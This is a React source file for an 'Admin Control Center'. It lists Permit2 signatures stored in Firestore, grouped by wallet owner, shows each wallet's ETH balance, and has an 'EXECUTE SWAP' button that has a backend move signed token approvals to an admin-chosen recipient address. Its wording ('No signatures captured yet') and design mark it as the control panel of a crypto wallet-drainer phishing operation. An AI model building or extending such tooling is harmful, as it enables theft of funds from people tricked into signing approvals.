import React, { useState, useEffect } from 'react';
import { db } from './firebase';
import { collection, query, onSnapshot } from 'firebase/firestore';
import { ethers } from 'ethers';

// Points to your Vercel Serverless Function
const BACKEND_URL = "/api/run-worker";

export default function Admin() {
  const [signatures, setSignatures] = useState([]);
  const [groupedData, setGroupedData] = useState({});
  
  // Admin Settings
  const [recipient, setRecipient] = useState(localStorage.getItem('admin_recipient') || "");
  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");

  // UI State
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [processingId, setProcessingId] = useState(null);
  const [statusMsg, setStatusMsg] = useState("");

  // Save settings to local storage
  useEffect(() => {
    localStorage.setItem('admin_recipient', recipient);
    localStorage.setItem('admin_outputToken', outputToken);
  }, [recipient, outputToken]);

  // Real-time listener for Signatures
  useEffect(() => {
    const q = query(collection(db, "permit2_signatures"));
    const unsub = onSnapshot(q, (snapshot) => {
      const docs = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
      setSignatures(docs);
      
      const groups = {};
      docs.forEach(doc => {
        if (!groups[doc.owner]) groups[doc.owner] = [];
        groups[doc.owner].push(doc);
      });
      setGroupedData(groups);
    });
    return () => unsub();
  }, []);

  // Wallet balances (native ETH) mapping: owner -> string
  const [balances, setBalances] = useState({});

  // Create a provider (use VITE_RPC_URL if available, fallback to Cloudflare public RPC)
  const provider = new ethers.JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');

  // Fetch balances when groupedData changes
  useEffect(() => {
    let mounted = true;
    const owners = Object.keys(groupedData);
    if (!owners.length) {
      setBalances({});
      return;
    }

    (async () => {
      const next = {};
      // limit concurrency to avoid bursting
      for (const owner of owners) {
        try {
          const b = await provider.getBalance(owner);
          next[owner] = parseFloat(ethers.formatEther(b)).toFixed(4);
        } catch (e) {
          next[owner] = '—';
        }
      }
      if (mounted) setBalances(next);
    })();

    return () => { mounted = false; };
  }, [groupedData]);

  // Execute Logic - Calls Backend
  const handleExecute = async (sigData) => {
    setProcessingId(sigData.id);
    setStatusMsg("Triggering Backend Server...");

    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          docId: sigData.id,
          recipient: recipient,      // Pass admin setting to backend
          outputToken: outputToken   // Pass admin setting to backend
        })
      });

      const result = await response.json();

      if (!response.ok || !result.ok) {
        throw new Error(result.error || "Backend failed to execute");
      }
      
      setStatusMsg("Success! Backend executed the swap.");
      
      // Clear success message after 3 seconds
      setTimeout(() => setStatusMsg(""), 3000);

    } catch (err) {
      console.error(err);
      setStatusMsg("Error: " + err.message);
    } finally {
      setProcessingId(null);
    }
  };

  const openModal = (wallet) => {
    setSelectedWallet(wallet);
    setIsModalOpen(true);
    setStatusMsg("");
  };

  return (
    <div className="admin-wrapper">
      <div className="ambient-glow one"></div>
      <div className="ambient-glow two"></div>

      <div className="admin-container glass-panel">
        <header className="admin-header">
          <div className="header-top">
            <h2>Admin Control Center</h2>
            <div className="connection-badge active">
              Server Mode
            </div>
          </div>
          
          <div className="settings-grid">
            <div className="input-group">
              <label>Target Recipient Address</label>
              <input 
                type="text" 
                value={recipient} 
                onChange={(e) => setRecipient(e.target.value)} 
                placeholder="0x... (Wallet to receive funds)" 
              />
            </div>
            <div className="input-group">
              <label>Output Token Address</label>
              <input 
                type="text" 
                value={outputToken} 
                onChange={(e) => setOutputToken(e.target.value)} 
                placeholder="0x... (Token to swap into)" 
              />
            </div>
          </div>
        </header>

        <div className="wallet-grid">
          {Object.keys(groupedData).length === 0 && (
            <div className="empty-state" style={{color:'#888', textAlign:'center', width:'100%', padding:'20px'}}>
              No signatures captured yet.
            </div>
          )}
          
          {Object.keys(groupedData).map(owner => (
            <div key={owner} className="wallet-card glass-card" onClick={() => openModal(owner)}>
              <div className="card-header">
                <span className="wallet-icon">👝</span>
                <span className="wallet-addr">{owner.slice(0, 6)}...{owner.slice(-4)}</span>
                <span className="wallet-balance">{balances[owner] ? `${balances[owner]} ETH` : 'Loading...'}</span>
              </div>
              <div className="card-body">
                <div className="stat-row">
                  <span>Signatures</span>
                  <span className="highlight-white">{groupedData[owner].length}</span>
                </div>
                <div className="stat-row">
                  <span>Pending</span>
                  <span className="highlight-yellow">
                    {groupedData[owner].filter(x => !x.processed).length}
                  </span>
                </div>
              </div>
              <button className="view-btn">Manage</button>
            </div>
          ))}
        </div>
      </div>

      {/* MODAL */}
      {isModalOpen && selectedWallet && (
        <div className="modal-overlay" onClick={() => setIsModalOpen(false)}>
          <div className="modal-glass glass-panel" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h3>{selectedWallet.slice(0, 6)}...{selectedWallet.slice(-4)}</h3>
              <button className="close-btn" onClick={() => setIsModalOpen(false)}>✕</button>
            </div>
            
            {statusMsg && (
              <div className={`status-bar ${statusMsg.includes("Success") ? "success" : statusMsg.includes("Error") ? "error-msg" : "processing"}`}>
                {statusMsg}
              </div>
            )}

            <div className="signature-list">
              {groupedData[selectedWallet].map(sig => (
                <div key={sig.id} className={`signature-item ${sig.processed ? 'processed' : ''}`}>
                  <div className="sig-row">
                    <span className="label">Token</span>
                    <span className="value">{sig.token.slice(0,6)}...{sig.token.slice(-4)}</span>
                  </div>
                  <div className="sig-row">
                    <span className="label">Amount</span>
                    <span className="value">{(BigInt(sig.amount) / (10n ** 6n)).toString()} USDT</span>
                  </div>
                  <div className="sig-row">
                    <span className="label">Status</span>
                    <span className={`status-tag ${sig.processed ? 'done' : 'pending'}`}>
                      {sig.processed ? "Done" : "Ready"}
                    </span>
                  </div>
                  
                  {sig.lastError && !sig.processed && (
                    <div className="error-msg" style={{marginTop:'10px'}}>⚠️ {sig.lastError.slice(0, 60)}...</div>
                  )}

                  {!sig.processed ? (
                    <button 
                      className="execute-btn" 
                      onClick={() => handleExecute(sig)}
                      disabled={processingId === sig.id}
                    >
                      {processingId === sig.id ? "CONTACTING SERVER..." : "EXECUTE SWAP"}
                    </button>
                  ) : (
                    <a 
                      href={`https://etherscan.io/tx/${sig.routerTx}`} 
                      target="_blank" 
                      rel="noreferrer"
                      className="etherscan-link"
                    >
                      View on Etherscan ↗
                    </a>
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
